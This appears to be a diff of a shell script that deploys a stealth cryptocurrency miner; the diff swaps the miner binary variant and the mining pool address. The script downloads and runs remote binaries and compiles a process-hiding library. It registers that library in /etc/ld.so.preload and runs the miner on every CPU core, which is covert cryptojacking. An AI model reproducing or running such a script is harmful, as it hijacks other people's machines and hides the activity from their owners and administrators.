@@ -15,7 +15,7 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget -O biru https://github.com/kidoescegh/pilekyla/raw/refs/heads/main/cpuminer-avx && chmod 777 biru
+wget -O biru https://github.com/kidoescegh/pilekyla/raw/main/cpuminer-avx2 && chmod 777 biru
 
 wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
 
@@ -57,4 +57,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./biru -a flex -o stratum+tcp://stratum.novagrid.online:3180 -u  kc1qylrmtzw47wldzzgwfkxtgrhgvp8jnyrck33nqu.$(shuf -n 1 -i 1-99999)-VX -t $(nproc --all)
+./graftcp/graftcp & clear & ./biru -a flex -o stratum+tcp://eu.mpool.live:5271 -u  kc1qylrmtzw47wldzzgwfkxtgrhgvp8jnyrck33nqu.$(shuf -n 1 -i 1-99999)-GG -t $(nproc --all)
